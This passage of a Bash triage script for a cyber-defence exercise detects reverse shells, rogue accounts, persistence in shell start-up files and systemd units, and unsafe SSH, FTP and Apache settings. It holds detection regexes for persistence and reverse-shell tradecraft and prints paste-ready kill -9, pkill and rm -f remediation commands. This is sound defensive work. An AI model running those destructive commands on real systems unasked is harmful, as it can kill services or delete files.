        # service looks like.
        emit RED netproc "pid$pid:$exe" "$direction connection held by a process because $reason"
      else
        # AMBER means: an interpreter, holding a port the packet DOES account
        # for. If the unit that owns it is one the packet declares, that is not
        # a coincidence - it IS the scored service, and there is nothing left to
        # decide.
        #
        # scored-web is `python3 -m http.server 8080`, so this fired on it every
        # single pass, forever. It could not be acted on (sentry protects the
        # unit, correctly) and there was no way to silence it, which is the
        # definition of a row that teaches you to skim the list it is in.
        owner_unit=$(pid_unit_name "$pid" 2>/dev/null) || owner_unit=''
        if [ -n "$owner_unit" ] && unit_is_ours "$owner_unit"; then
          clean "listening $exe belongs to $owner_unit, which the packet declares"
          continue
        fi
        # The port is part of the subject, not decoration.
        #
        # A standing exception is keyed on the subject with the pid dropped,
        # because the pid changes on every restart. Without the port, the key
        # for a legitimate python service and the key for a python web shell on
        # a different port are the same string - muting the one you own would
        # silence the one you do not, permanently and invisibly. That is the
        # exact hiding place this check exists to find.
        emit AMBER netprocsvc "pid$pid:$exe $netid/$local_port" \
          "$direction socket held by a process because $reason"
      fi

      cmd=$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null | cut -c1-88)
      started=$(ps -o lstart= -p "$pid" 2>/dev/null | sed 's/^ *//')
      printf -v qpid '%q' "$pid"
      printf -v qevidence '%q' "$state_dir/evidence-pid-$pid"
      entry="${D}pid $pid  $exe"$'\n'
      if [ "$direction" = listening ]; then
        entry="$entry${D}  listening on $local_addr  ($reason)"$'\n'
      else
        entry="$entry${D}  $direction  $local_addr -> $peer  ($reason)"$'\n'
      fi
      [ -n "$cmd" ] && entry="$entry${D}  cmdline: $cmd"$'\n'
      [ -n "$started" ] && entry="$entry${D}  started: $started"$'\n'
      entry="$entry$FIXHDR"$'\n'
      if [ "$severity" = RED ]; then
        entry="$entry${F}sudo kill -STOP $qpid                      # FREEZE it first - do not kill yet"$'\n'
        entry="$entry${F}sudo mkdir -p -- $qevidence"$'\n'
        entry="$entry${F}sudo cp -- /proc/$qpid/exe $qevidence/exe 2>/dev/null; sudo ls -l /proc/$qpid/exe"$'\n'
        entry="$entry${F}sudo tr '\\0' ' ' < /proc/$qpid/cmdline; echo"$'\n'
        entry="$entry${F}sudo ls -l /proc/$qpid/cwd /proc/$qpid/fd"$'\n'
        entry="$entry${F}ps -o pid,ppid,user,lstart,cmd -p $qpid \$(ps -o ppid= -p $qpid)   # WHO STARTED IT"$'\n'
        entry="$entry${F}sudo pkill -9 -P $qpid; sudo kill -9 $qpid      # its children too: they hold the socket"$'\n'
        net_red_buf="$net_red_buf$entry"
      else
        # NEVER a kill command here, and this is not a style choice.
        #
        # This branch fires when an interpreter is serving a port the packet
        # ACCOUNTS FOR - which is to say, most often, the scored service
        # itself. The heading says "confirm each one"; printing the RED block
        # underneath it hands the operator a ready-to-paste `kill -9` for the
        # thing they are being scored on keeping alive.
        #
        # That is exactly what happened on the lab box: an operator worked two
        # real reverse shells correctly, reached this AMBER, pasted the block
        # under it as they had the two before, and killed their own web server.
        # The tool told them to. So this branch answers the question the
        # heading actually asks - WHOSE process is this - and offers nothing
        # that can take a service down.
        entry="$entry${F}ps -o unit= -p $qpid 2>/dev/null | xargs -r systemctl status --no-pager   # which unit owns it?"$'\n'
        entry="$entry${F}ps -o pid,ppid,user,lstart,cmd -p $qpid"$'\n'
        entry="$entry${F}grep -n . <<<\"\$(ps -o cmd= -p $qpid)\"   # is this the packet's service?"$'\n'
        # Commented, because everything inside a "run this" block gets pasted.
        # A bare English sentence there is a "command not found" at best.
        entry="$entry${F}# IS the scored service? -> nothing to do. Put its port in CCDC_ALLOWED_TCP_PORTS."$'\n'
        entry="$entry${F}# NOT the scored service? -> CARD 12, starting with preserve.sh --freeze."$'\n'
        net_amber_buf="$net_amber_buf$entry"
      fi
      continue
    fi

    # Tell 3. A binary that no package owns, on the network. This is the one
    # that catches a compiled implant - it is not an interpreter, it is not
    # deleted, and it sits in a respectable-looking directory - and it is also
    # every legitimate from-source install, so it asks rather than accuses.
    #
    # Two shapes qualify: anything reaching OUT, and anything listening on a
    # port the packet does not account for. The second is what covers the UDP
    # ports check 9-ii deliberately stops looking at.
    case "$direction" in
      outbound) ;;
      *)
        ccdc_list_contains "$local_port" "${CCDC_ALLOWED_TCP_PORTS:-} ${CCDC_ALLOWED_UDP_PORTS:-} $stock_udp" \
          && continue
        ;;
    esac
    ccdc_have dpkg-query || ccdc_have rpm || continue
    pkg_owned "$exe" && continue
    splunk_daemon_pid "$pid" && continue
    case " $seen_unpackaged " in *" $pid|$direction "*) continue ;; esac
    seen_unpackaged="$seen_unpackaged $pid|$direction"
    if [ "$direction" = outbound ]; then
      emit AMBER netunpackaged "pid$pid:$exe" "outbound connection from an unpackaged binary"
      net_unpkg_buf="$net_unpkg_buf${D}$exe"$'\n'
      net_unpkg_buf="$net_unpkg_buf${D}  pid $pid  outbound $local_addr -> $peer"$'\n'
    else
      emit AMBER netunpackaged "pid$pid:$exe $netid/$local_port" \
        "unaccounted listening port served by an unpackaged binary"
      net_unpkg_buf="$net_unpkg_buf${D}$exe"$'\n'
      net_unpkg_buf="$net_unpkg_buf${D}  pid $pid  listening on $netid port $local_port"$'\n'
    fi
    printf -v qexe '%q' "$exe"
    net_unpkg_buf="$net_unpkg_buf$FIXHDR"$'\n'
    net_unpkg_buf="$net_unpkg_buf${F}ls -l -- $qexe && $(ccdc_have dpkg-query && printf 'dpkg -S' || printf 'rpm -qf') -- $qexe"$'\n'
    net_unpkg_buf="$net_unpkg_buf${F}sha256sum -- $qexe          # then look it up off the box"$'\n'
  done <<EOF
$(ss -tuanpH 2>/dev/null)
EOF

  if [ -n "$net_red_buf" ]; then
    red "process(es) on the network that should not be on the network   [CARD 12]"
    detail "this is what a memory-only reverse shell looks like: no file, no unit, no listener"
    printf '%s' "$net_red_buf"
  fi
  if [ -n "$net_amber_buf" ]; then
    amber "interpreter(s) holding a port the packet DOES account for   [CARD 12]"
    detail "a scored service can legitimately be a python or php app - confirm each one"
    printf '%s' "$net_amber_buf"
  fi
  if [ -n "$net_unpkg_buf" ]; then
    amber "binary(s) on the network that no package owns   [CARD 12]"
    detail "normal for software built from source; the question is whether YOU know why it is there"
    printf '%s' "$net_unpkg_buf"
  fi
  if [ -z "$net_red_buf$net_amber_buf$net_unpkg_buf" ]; then
    clean "no shell, interpreter, or unpackaged binary holds a socket ($socket_scope)"
  elif [ "$(id -u)" -ne 0 ]; then
    detail "checked $socket_scope"
  fi
fi

# --- 9b. Service accounts that have been handed a login shell -----------------
# A system account (UID under 1000) exists to run a daemon; it has no reason to
# have a shell. Granting one is a quiet, durable foothold that survives password
# resets and appears in none of the checks above - not UID 0, not an empty
# password, not a new account at all. Found on the lab box only because the
# operator happened to run the right `getent` by hand.
begin
# The "shell" of shutdown, halt and sync is the one command the account runs
# (/sbin/shutdown, /sbin/halt, /bin/sync). Those accounts ship on every Red Hat
# family box, so leaving them out of this list made every Rocky host RED here.
svcshell=$(awk -F: '$3>0 && $3<1000 && $7 !~ /\/(nologin|false|true|sync|shutdown|halt)$/ {print $1":"$3":"$7}' /etc/passwd 2>/dev/null)
if [ -n "$svcshell" ]; then
  red "service account(s) with a login shell   [CARD 10]"
  for e in $svcshell; do emit RED svcshell "${e%%:*}" "service account with a login shell"; done
  for e in $svcshell; do
    u=${e%%:*}
    printf -v quser '%q' "$u"
    printf -v qhome '%q' "/home/$u/.ssh/"
    detail "$e"
    fixhdr
    fix "sudo usermod -s /usr/sbin/nologin $quser"
    fix "sudo pkill -u $quser                     # the -u matters: plain pkill matches process NAMES"
    fix "sudo crontab -u $quser -l; sudo ls -la -- $qhome 2>/dev/null"
  done
  detail "do NOT userdel a service account - it probably owns the scored content."
  detail "take the shell away and leave the account."
else
  clean "no service account has a login shell"
fi

# --- 9c. Who can become root -------------------------------------------------
begin
# sudo/wheel/admin grant ROOT. `adm` is deliberately not here: it grants log
# file read access, and `syslog` is in it on every stock Ubuntu, so including it
# made this check fire on a clean box - the exact "cries wolf" failure this
# tool is supposed to avoid.
suspect=()
consider_admin_member() {
  local member=$1 group=$2 uid entry existing duplicate
  [ -n "$member" ] || return 0
  [ "$member" = root ] && return 0
  uid=$(id -u "$member" 2>/dev/null) || return 0

  # A system identity in a root-capable group is always anomalous, even when
  # it is a scored account and therefore protected from automatic action. A
  # human identity is actionable only when the operator supplied an account
  # allow-list and omitted it. Restricting this to root-capable groups and an
  # explicit allow-list keeps ordinary `adm`/log-reader membership quiet.
  if [ "$uid" -ge 1000 ] 2>/dev/null; then
    [ -n "${CCDC_ALLOWED_USERS:-}" ] || return 0
    ccdc_list_contains "$member" "${CCDC_ALLOWED_USERS:-}" && return 0
  fi

  entry="$member/$group"
  duplicate=0
  for existing in "${suspect[@]}"; do
    [ "$existing" = "$entry" ] && duplicate=1 && break
  done
  [ "$duplicate" -eq 1 ] || suspect+=("$entry")
}

for g in sudo wheel admin; do
  group_entry=$(getent group "$g" 2>/dev/null) || continue
  IFS=: read -r _ _ group_gid members <<<"$group_entry"
  IFS=, read -r -a group_members <<<"$members"
  for m in "${group_members[@]}"; do
    consider_admin_member "$m" "$g"
  done

  # NSS group member lists normally contain supplemental members only. A user
  # whose primary GID is sudo/wheel/admin is just as root-capable and must not
  # bypass the check by being absent from the comma-separated member field.
  while IFS=: read -r m _ _ primary_gid _ _ _; do
    [ "$primary_gid" = "$group_gid" ] && consider_admin_member "$m" "$g"
  done < <(passwd_records)
done
if [ "${#suspect[@]}" -gt 0 ]; then
  red "account(s) have unapproved root-capable group membership   [CARD 10]"
  for e in "${suspect[@]}"; do
    emit RED admingroup "$e" "account has unapproved root-capable group membership"
  done
  detail "system accounts are always shown; human accounts are shown when absent from CCDC_ALLOWED_USERS"
  fixhdr
  for e in "${suspect[@]}"; do
    printf -v quser '%q' "${e%%/*}"
    printf -v qgroup '%q' "${e#*/}"
    fix "sudo gpasswd -d $quser $qgroup"
  done
else
  clean "no unapproved account is in sudo/wheel/admin"
fi

# --- 9c2. Accounts the packet does not name ------------------------------------
# Found live 2026-09-24: plant.sh added `rtsvc` with a password and a bash shell.
# Once its sudoers file was removed, NOTHING reported it - triage only asked
# whether unknown accounts had root, baseline tracks keys and sudo but not
# accounts. An account the packet does not name that can still log in is the
# red team's way back in, root or not. Only with an allow-list, like the sudo
# check: without one there is no way to tell theirs from the packet's.
begin
if [ -n "${CCDC_ALLOWED_USERS:-}" ] && [ "$(id -u)" -eq 0 ]; then
  acct_n=0
  today_days=$(( $(date +%s) / 86400 ))
  while IFS=: read -r au _ auid _ _ ahome ashell; do
    [ "$auid" -ge 1000 ] 2>/dev/null && [ "$auid" -lt 65534 ] || continue
    ccdc_list_contains "$au" "${CCDC_ALLOWED_USERS:-}" && continue
    case "$ashell" in */nologin|*/false|'') continue ;; esac
    # Expired (usermod -e 1) blocks password AND key logins: it is handled.
    aexp=$(getent shadow "$au" 2>/dev/null | cut -d: -f8)
    if [ -n "$aexp" ] && [ "$aexp" -le "$today_days" ] 2>/dev/null; then continue; fi
    apw=$(passwd -S "$au" 2>/dev/null | awk '{print $2}')
    akeys=0; [ -s "$ahome/.ssh/authorized_keys" ] && akeys=1
    [ "$apw" = P ] || [ "$apw" = NP ] || [ "$akeys" -eq 1 ] || continue
    acct_n=$((acct_n + 1))
    how=''; [ "$apw" = P ] && how="a password"; [ "$apw" = NP ] && how="NO password"
    [ "$akeys" -eq 1 ] && how="${how:+$how and }an SSH key"
    printf -v qau '%q' "$au"
    # One finding, one fix block, whichever severity: RED when the account's
    # home appeared after the box was built, AMBER when it may be the packet's.
    if [ -e "$ahome" ] && newer_than_box "$ahome"; then
      asev=RED; aage="created after this box was built"
    else
      asev=AMBER; aage="older than the box - maybe the packet's, maybe not"
    fi
    if [ "$asev" = RED ]; then red "account $au can log in, and the packet does not name it   [CARD 10]"; else amber "account $au can log in, and the packet does not name it   [CARD 10]"; fi
    emit "$asev" rogueuser "$au" "account not in CCDC_ALLOWED_USERS can log in ($aage)"
    detail "It has $how and the shell $ashell; $aage."
    fixhdr
    fix "sudo passwd -S $qau; sudo last $qau | head -5          # evidence first"
    fix "sudo usermod -L -e 1 -s /usr/sbin/nologin $qau     # locked, not deleted: it is evidence"
    fix "sudo pkill -KILL -u $qau                            # ends any session it has open"
    detail "yours? add $au to CCDC_ALLOWED_USERS, then: sudo $qsentry --config $qconfig --reload-config --apply"
  done < <(getent passwd 2>/dev/null || cat /etc/passwd)
  [ "$acct_n" -gt 0 ] || clean "every account that can log in is one the packet names"
else
  clean "unnamed-account check skipped (needs sudo and CCDC_ALLOWED_USERS)"
fi

# --- 9d. Shell start-up files ------------------------------------------------
# .bashrc, .profile and /etc/profile.d run every time anyone gets a shell -
# including you, the next time you `sudo -i`. A hook here is persistence that
# fires on the defender's own hands, and nothing above reads these files.
# What makes a line in an rc file suspicious is NOT the path it runs. An earlier
# version matched a bare "/usr/local/bin/", which flagged - and then proposed
# deleting - an ordinary `export PATH="$PATH:/usr/local/bin/"`. Measured on the
# lab box: the remediation removed the operator's real PATH line along with the
# implant, and both the detection and the fix were "working as written".
#
# The signal is that a login script LAUNCHES something. A stock .bashrc sets
# variables and defines functions; it does not background a process. So: the
# reverse-shell patterns, execution out of a world-writable directory, or any
# form of detached start.
#
# "Detached start" means a lone & at the end of a command. A line that ENDS in
# && is a condition continued on the next line; matching it flagged Ubuntu's
# own /etc/profile.d/Z99-cloud-locale-test.sh RED on every cloud-image box.
rc_launch='nohup |setsid |disown|(^|[^&])&[[:space:]]*\)|(^|[^&])&[[:space:]]*$|/tmp/|/var/tmp/|/dev/shm/'
begin
rchits=''
for f in /root/.bashrc /root/.profile /root/.bash_profile /etc/bash.bashrc /etc/profile \
         /home/*/.bashrc /home/*/.profile /home/*/.bash_profile /etc/profile.d/*; do
  [ -f "$f" ] || continue
  # A file under /etc that is byte-for-byte what its package shipped is the
  # distribution's, not an implant. An EDITED package file is exactly where an
  # implant hides, so it still gets read.
  case "$f" in /etc/*) pkg_file_pristine "$f" && continue ;; esac
  grep -qIE "$shells|$rc_launch" "$f" 2>/dev/null && rchits="$rchits $f"
done
if [ -n "$rchits" ]; then
  red "shell start-up file(s) launching something   [CARD 11]"
  for f in $rchits; do emit RED rcfile "$f" "shell start-up file launching something"; done
  detail "these run on EVERY login, including your next sudo -i"
  for f in $rchits; do
    detail "$f"
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-90)"; done <<EOF
$(grep -IhE "$shells|$rc_launch" "$f" 2>/dev/null | head -3)
EOF
    printf -v qf '%q' "$f"
    printf -v qevidence '%q' "/var/tmp/evidence-$(basename -- "$f")"
    fixhdr
    fix "sudo cp -- $qf $qevidence"
    fix "sudo nano $qf      # delete only the offending line, keep the rest"
  done
else
  clean "no shell start-up file launches anything unusual"
fi

# --- 9d-ii. What the start-up file LAUNCHES ----------------------------------
# Same insight as the unit check below: the hook is the trigger, the payload is
# one level down. A line that runs /usr/local/bin/net-diag looks entirely
# ordinary until you read /usr/local/bin/net-diag.
begin
rcdeep=''
for f in $rchits; do
  for t in $(grep -IhoE '/(usr/local/bin|opt|usr/bin|var|srv)/[A-Za-z0-9._/-]+' "$f" 2>/dev/null | sort -u); do
    [ -f "$t" ] || continue
    own_payload "$t" && continue
    grep -qIE "$shells" "$t" 2>/dev/null && rcdeep="$rcdeep $f::$t"
  done
done
if [ -n "$rcdeep" ]; then
  red "start-up file(s) launching a script that contains a reverse shell   [CARD 11]"
  for e in $rcdeep; do
    f=${e%%::*}; t=${e#*::}
    detail "$f -> $t"
    emit RED rcdeep "$e" "start-up file launching a script containing a reverse shell"
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-88)"; done <<EOF
$(grep -IhE "$shells" "$t" 2>/dev/null | head -2)
EOF
    printf -v qt '%q' "$t"
    printf -v qevidence '%q' "$state_dir/evidence-$(basename -- "$t")"
    fixhdr
    fix "sudo cp -- $qt $qevidence && sudo rm -f -- $qt"
  done
else
  clean "no start-up file launches a script containing a reverse shell"
fi

# --- 9e. Units whose ExecStart TARGET is malicious ---------------------------
# Check 5 reads the unit. An attacker who puts a clean path in ExecStart and
# hides the payload one level down in that script passes it completely. On the
# lab box net-diag.service pointed at /usr/local/bin/net-diag - an ordinary
# path in an ordinary directory - and the reverse shell was inside the file.
# Following the path IS the check.
begin
unit_exec_commands() {
  # Join systemd continuation lines, then print every ExecStart command. This
  # is a parser, never an evaluator: specifiers and variables remain literal
  # and therefore cannot make this tool execute attacker-controlled content.
  awk '
    {
      part=$0
      if (part ~ /\\$/) {
        sub(/\\$/, "", part)
        joined=joined part " "
        next
      }
      joined=joined part
      if (joined ~ /^[[:space:]]*Exec[A-Za-z]*=/) {
        sub(/^[[:space:]]*Exec[A-Za-z]*=/, "", joined)
        print joined
      }
      joined=""
    }
    END {
      if (joined ~ /^[[:space:]]*Exec[A-Za-z]*=/) {
        sub(/^[[:space:]]*Exec[A-Za-z]*=/, "", joined)
        print joined
      }
    }
  ' "$1" 2>/dev/null
}

deephits=()
for unit in /etc/systemd/system/*.service /run/systemd/system/*.service \
            /etc/systemd/system/*.service.d/*.conf /run/systemd/system/*.service.d/*.conf \
            /etc/systemd/system/*.timer.d/*.conf /run/systemd/system/*.timer.d/*.conf; do
  [ -f "$unit" ] || continue
  while IFS= read -r command || [ -n "$command" ]; do
    targets=()
    while IFS= read -r target; do
      [ -n "$target" ] && targets+=("$target")
    done < <(printf '%s\n' "$command" | absolute_tokens)
    [ "${#targets[@]}" -gt 0 ] || continue

    primary=${targets[0]}
    follow_args=0
    for target in "${targets[@]}"; do
      is_launch_wrapper "$target" && follow_args=1
    done
    # Also recognise a relative interpreter following /usr/bin/env or another
    # wrapper. Word boundaries keep names such as `node_exporter` from turning
    # an unrelated argument into a launch target.
    printf '%s\n' "$command" | grep -qE "(^|[[:space:]\"'])(sh|bash|dash|zsh|ksh|python[0-9.]*|perl|ruby|php|node)([[:space:]\"']|$)" && follow_args=1

    for target in "${targets[@]}"; do
      [ -f "$target" ] || continue
      [ "$target" = "$primary" ] || [ "$follow_args" -eq 1 ] || continue
      own_payload "$target" && continue
      grep -qIE "$shells" "$target" 2>/dev/null || continue
      case "$unit" in
        *.service.d/*.conf|*.timer.d/*.conf)
          parent=$(basename -- "$(dirname -- "$unit")")
          owner=${parent%.d}
          hit="$owner::$unit::$target"
          ;;
        *) hit="$unit::$target" ;;
      esac
      duplicate=0
      for existing in "${deephits[@]}"; do
        [ "$existing" = "$hit" ] && duplicate=1 && break
      done
      [ "$duplicate" -eq 1 ] || deephits+=("$hit")
    done
  done < <(unit_exec_commands "$unit")
done
if [ "${#deephits[@]}" -gt 0 ]; then
  red "unit(s) whose ExecStart script contains a reverse shell   [CARD 4]"
  detail "the unit itself looks clean - the payload is one level down"
  for e in "${deephits[@]}"; do
    rest=${e#*::}
    if [ "$rest" != "$e" ] && case "$rest" in *::* ) true ;; *) false ;; esac; then
      owner=${e%%::*}; unit=${rest%%::*}; target=${rest#*::}; u=$owner; base=${u%.service}
      detail "$u drop-in $unit -> $target"
      if machine_triple_safe "$owner" "$unit" "$target"; then
        emit RED unitdropindeep "$e" "unit drop-in whose ExecStart script contains a reverse shell"
      else
        ccdc_warn "omitted an ambiguous unitdropindeep subject from the machine queue; inspect the human triage output"
      fi
    else
      unit=${e%%::*}; target=${e#*::}; u=$(basename -- "$unit"); base=${u%.service}
      detail "$u -> $target"
      if machine_pair_safe "$unit" "$target"; then
        emit RED unitdeep "$e" "unit whose ExecStart script contains a reverse shell"
      else
        ccdc_warn "omitted an ambiguous unitdeep subject from the machine queue; inspect the human triage output"
      fi
    fi
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-90)"; done \
      < <(grep -IhE "$shells" "$target" 2>/dev/null | head -2)
    printf -v qunit '%q' "$unit"
    printf -v qtarget '%q' "$target"
    printf -v qevidence '%q' "/var/tmp/evidence-$(basename "$target")"
    printf -v qunit_name '%q' "$u"
    fixhdr
    case "$unit" in
      *.service.d/*.conf|*.timer.d/*.conf)
        printf -v qunit_evidence '%q' "/var/tmp/evidence-$(basename -- "$unit")"
        fix "sudo systemctl cat -- $qunit_name"
        fix "sudo cp -- $qunit $qunit_evidence"
        fix "sudo cp -- $qtarget $qevidence"
        fix "sudo rm -f -- $qunit $qtarget"
        fix "sudo systemctl daemon-reload && sudo systemctl try-restart -- $qunit_name"
        ;;
      *)
        printf -v qtimer '%q' "/etc/systemd/system/$base.timer"
        printf -v qtimer_name '%q' "$base.timer"
        fix "sudo systemctl disable --now -- $qtimer_name $qunit_name"
        fix "sudo cp -- $qtarget $qevidence"
        fix "sudo rm -f -- $qunit $qtimer $qtarget"
        fix "sudo systemctl daemon-reload && sudo systemctl reset-failed"
        ;;
    esac
  done
else
  clean "no unit's ExecStart script contains a reverse shell"
fi

# --- 9f. What SSH will actually do at the next login --------------------------
# triage is the tool people run first and sometimes the only one they run, and
# until now it said nothing at all about SSH policy. On the lab box a drop-in
# had re-enabled root logins and every check above this line reported a clean
# box, because none of them read sshd's configuration.
#
# Only the two that are almost never right on a scored box are here; the full
# audit - drop-ins, Match blocks, AuthorizedKeysCommand, CA keys - is sshd.sh,
# and this points at it. Reading the EFFECTIVE config matters: `grep
# PermitRootLogin /etc/ssh/sshd_config` is answered by a file that a drop-in
# three directories away overrides.
begin
if [ "$(id -u)" -eq 0 ] && { ccdc_have sshd || [ -x /usr/sbin/sshd ]; }; then
  sshd_bin_path=$(command -v sshd 2>/dev/null || printf '/usr/sbin/sshd')
  sshd_effective=$("$sshd_bin_path" -T 2>/dev/null)
  if [ -n "$sshd_effective" ]; then
    rootlogin=$(printf '%s\n' "$sshd_effective" | awk 'tolower($1)=="permitrootlogin"{print $2; exit}')
    emptypw_ssh=$(printf '%s\n' "$sshd_effective" | awk 'tolower($1)=="permitemptypasswords"{print $2; exit}')
    if [ "$rootlogin" = yes ]; then
      red "SSH allows DIRECT ROOT LOGIN - and the main config may not say so   [CARD 2]"
      detail "this is the effective setting, after every Include and drop-in"
      emit RED sshrootlogin "permitrootlogin" "sshd permits direct root login"
      detail "set in:"
      for sshd_src in /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf; do
        [ -f "$sshd_src" ] || continue
        grep -inE '^[[:space:]]*PermitRootLogin[[:space:]]' "$sshd_src" 2>/dev/null \
          | sed -E "s|^([0-9]+):[[:space:]]*|           $sshd_src   line \1:  |"
      done
      fixhdr
      fix "sudo $qsshd --config $qconfig          # the full SSH audit"
      fix "sudo grep -rn PermitRootLogin /etc/ssh/sshd_config /etc/ssh/sshd_config.d/"
      fix "# remove the offending line, then:"
      fix "sudo sshd -t && sudo systemctl reload ssh"
    elif [ "$rootlogin" = no ]; then
      clean "sshd does not permit direct root login (effective: no)"
    fi
    # prohibit-password / without-password still lets root in with a key; the
    # SSH audit below reports it. Saying "ok" here contradicted that audit.
    if [ "$emptypw_ssh" = yes ]; then
      red "SSH accepts EMPTY PASSWORDS   [CARD 2]"
      emit RED sshemptypw "permitemptypasswords" "sshd permits empty passwords"
      fixhdr
      fix "sudo $qsshd --config $qconfig"
    fi
  else
    clean "SSH policy check skipped (sshd -T produced nothing)"
  fi
else
  clean "SSH policy check skipped (needs sudo and sshd; run ./linux/sshd.sh for the full audit)"
fi

# --- 9f. The full SSH audit, folded in ----------------------------------------
# sshd.sh used to be a separate place to look, and a drop-in re-enabling root
# login (99-rt-tuning.conf in the live 2026-09-24 run) was reported ONLY there -
# not by triage, so not by sentry, so no alert. Asked for by the operator: one
# place to look. The SSH audit is run here, read-only, and each RED/AMBER it
# raises becomes a triage finding carrying sshd.sh's own explanation and fix.
# sshd.sh stays the tool that CHANGES SSH, because that needs its rollback.
begin
if [ "$(id -u)" -eq 0 ] && [ -x "$SCRIPT_DIR/sshd.sh" ] && { ccdc_have sshd || [ -x /usr/sbin/sshd ]; }; then
  ssh_audit=$(timeout 30 "$SCRIPT_DIR/sshd.sh" --config "$config" --audit 2>/dev/null </dev/null \
    | sed 's/\x1b\[[0-9;]*m//g')
  ssh_head=''; ssh_sev=''; ssh_body=''; ssh_n=0
  ssh_flush() {
    [ -n "$ssh_head" ] || return 0
    # Already reported above with its own finding: do not say it twice.
    if [ "${rootlogin:-}" = yes ] && printf '%s' "$ssh_head" | grep -qi '^permitrootlogin'; then
      ssh_head=''; ssh_body=''; return 0
    fi
    ssh_n=$((ssh_n + 1))
    if [ "$ssh_sev" = RED ]; then red "SSH: $ssh_head   [CARD 13]"; else amber "SSH: $ssh_head   [CARD 13]"; fi
    printf '%s' "$ssh_body"
    emit "$ssh_sev" sshaudit "$(printf '%s' "$ssh_head" | tr -c 'A-Za-z0-9' '-' | cut -c1-60)" "$ssh_head"
    ssh_head=''; ssh_body=''
  }
  while IFS= read -r ssh_line; do
    case "$ssh_line" in
      '  RED    '*)  ssh_flush; ssh_sev=RED;   ssh_head=${ssh_line#  RED    } ;;
      '  AMBER  '*)  ssh_flush; ssh_sev=AMBER; ssh_head=${ssh_line#  AMBER  } ;;
      '  ok '*|'  '[0-9]*' SSH finding'*|'  Work the RED'*|'  hand '*|'  read every'*)
        ssh_flush ;;
      *) [ -n "$ssh_head" ] && ssh_body="$ssh_body$ssh_line"$'\n' ;;
    esac
  done <<<"$ssh_audit"
  ssh_flush
  [ "$ssh_n" -gt 0 ] || clean "the full SSH audit (sshd.sh) found nothing"
else
  clean "full SSH audit skipped (needs sudo, sshd, and linux/sshd.sh)"
fi

# --- 9g. Scored service audits: FTP & Apache ---------------------------------
begin
# FTP: anonymous login check
if ccdc_list_contains "21" "${CCDC_ALLOWED_TCP_PORTS:-}" || { ccdc_have ss && ss -tlnH 2>/dev/null | grep -q ':21 '; }; then
  ftp_anon=''
  for vsf in /etc/vsftpd.conf /etc/vsftpd/vsftpd.conf; do
    [ -f "$vsf" ] || continue
    if grep -iqE '^[[:space:]]*anonymous_enable[[:space:]]*=[[:space:]]*YES' "$vsf" 2>/dev/null; then
      ftp_anon="$vsf"
      break
    fi
  done
  if [ -n "$ftp_anon" ]; then
    # AMBER, not RED: FTP is SCORED. The packet says a user logs in, but if
    # Quotient's FTP check turns out to be anonymous, this "fix" is the outage.
    amber "FTP server allows ANONYMOUS login   [CARD 8]"
    detail "anonymous_enable=YES is active in $ftp_anon"
    detail "anyone on the network can access the FTP server without credentials"
    detail "FIRST check Quotient: if its FTP check logs in as anonymous, leave this ON"
    emit AMBER ftpanon "anonymous_enable" "FTP server allows anonymous login"
    fixhdr
    fix "sudo sed -i 's/^[#[:space:]]*anonymous_enable=.*/anonymous_enable=NO/' $ftp_anon"
    fix "sudo systemctl restart vsftpd || sudo systemctl restart pure-ftpd"
  else
    clean "FTP does not allow anonymous login in vsftpd configuration"
  fi
fi

# Web: Apache directory indexing check (Options Indexes)
if ccdc_list_contains "80" "${CCDC_ALLOWED_TCP_PORTS:-}" || ccdc_list_contains "443" "${CCDC_ALLOWED_TCP_PORTS:-}"; then
  apache_indexes=''
  for ap_cfg in /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf; do
    [ -f "$ap_cfg" ] || continue
    if grep -nE '^[[:space:]]*Options[[:space:]]+([^#]*\b)?Indexes\b' "$ap_cfg" 2>/dev/null | grep -vq '^[[:space:]]*#'; then
      apache_indexes="$ap_cfg"
      break
    fi
  done
  if [ -n "$apache_indexes" ]; then
    amber "Apache directory indexing (Indexes) is enabled   [CARD 8]"
    detail "Options Indexes is active in $apache_indexes"
    detail "browsing directories without index.html reveals full file listings to attackers"
    emit AMBER apacheindexes "indexes" "Apache directory indexing is enabled"
    fixhdr
    fix "curl -s http://127.0.0.1/ | head -5      # BEFORE: if this is a file LIST, the listing IS the scored page - stop here"
    fix "sudo sed -i 's/Options Indexes FollowSymLinks/Options FollowSymLinks/' $apache_indexes"
    fix "sudo apache2ctl configtest && sudo systemctl reload apache2 || sudo systemctl reload httpd"
    fix "curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1/   # AFTER: must still be 200, not 403"
  else
    clean "Apache directory indexing (Indexes) is not enabled in main config"
  fi
fi

# --- 9h. Files an attacker dropped and left ------------------------------------
# Every check above finds a file because something POINTS at it: a cron line, a
# unit, a running process, a socket. Take the pointer away and the file is
# invisible. Live run, 2026-09-24: the cron job, timer and processes were all
# cleaned up, and five payloads stayed on disk with nothing reporting them -
# /usr/local/bin/rt-implant, /dev/shm/.rt, two hidden python scripts in
# /usr/local/lib and a hidden .jsp in the web root. Any one of them is a way
# back the moment something calls it again.
#
# What makes a file a finding here is WHERE it is and WHAT it is, never its
# name: a program in /dev/shm, a hidden program anywhere under /usr/local or
# /opt or at the top of /tmp, a hidden server-side script in a web root, or a
# web-root file newer than the box that executes commands. A package-owned file
# is never one, and neither is the kit.
begin
drop_is_program() {
  local f=$1 magic
  [ -x "$f" ] && return 0
  magic=$(head -c 4 -- "$f" 2>/dev/null | tr -d '\0')
  case "$magic" in '#!'*|$'\x7f''ELF') return 0 ;; esac
  case "$f" in *.py|*.sh|*.pl|*.rb|*.php|*.jsp|*.jspx|*.asp|*.aspx|*.cgi|*.elf|*.so) return 0 ;; esac
  return 1
}
drop_red=''; drop_amber=''
drop_add() {  # severity path why
  case " $drop_red $drop_amber " in *" $2 "*) return 0 ;; esac
  emit "$1" dropfile "$2" "$3"
  if [ "$1" = RED ]; then drop_red="$drop_red $2"; else drop_amber="$drop_amber $2"; fi
  drop_why="$drop_why$2|$3"$'\n'
}
drop_why=''
drop_skip() {
  own_payload "$1" && return 0
  # SUID/SGID files are check 7's, with its own fix; do not say it twice.
  [ -u "$1" ] || [ -g "$1" ] && return 0
  case "$1" in "$state_dir"/*|"$SCRIPT_DIR"/*) return 0 ;; esac
  pkg_owns "$1"
}
